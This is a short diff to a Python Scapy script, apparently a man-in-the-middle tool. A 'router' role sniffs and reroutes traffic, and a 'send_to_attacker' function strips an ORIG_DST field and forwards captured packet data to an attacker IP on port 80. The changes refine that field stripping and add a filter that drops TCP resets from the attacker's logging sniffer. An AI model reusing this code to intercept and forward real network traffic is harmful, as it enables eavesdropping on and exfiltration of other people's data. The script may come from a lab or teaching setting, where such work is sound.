@@ -50,7 +50,10 @@ def send_to_attacker(packet):
         if(data.decode("utf-8").find('|ORIG_DST=') != -1):
             test_field = "|ORIG_DST="
             tmp_data = data.decode("utf-8").partition(test_field)
-            replacement_data = tmp_data[0] + tmp_data[2]
+            if(tmp_data[2].find('|') != -1):
+                replacement_data = tmp_data[0] + tmp_data[2][tmp_data[2].find('|'):]
+            else:
+                replacement_data = tmp_data[0]
             data = replacement_data.encode("utf-8")
         new_packet = IP(dst=my_ips.attacker_ip)/TCP(dport=80)/Raw(load=data)
 
@@ -170,4 +173,4 @@ if __name__=='__main__':
     elif(role == 'router'):
         packet_sniffer('dst host ' + my_ips.router_ip + ' and tcp', reroute_packet)
     elif(role == 'attacker'):
-        packet_sniffer('src host ' + my_ips.router_ip + ' and tcp', log_packet)
+        packet_sniffer('src host ' + my_ips.router_ip + ' and tcp and not tcp[tcpflags] & (tcp-rst) != 0', log_packet)
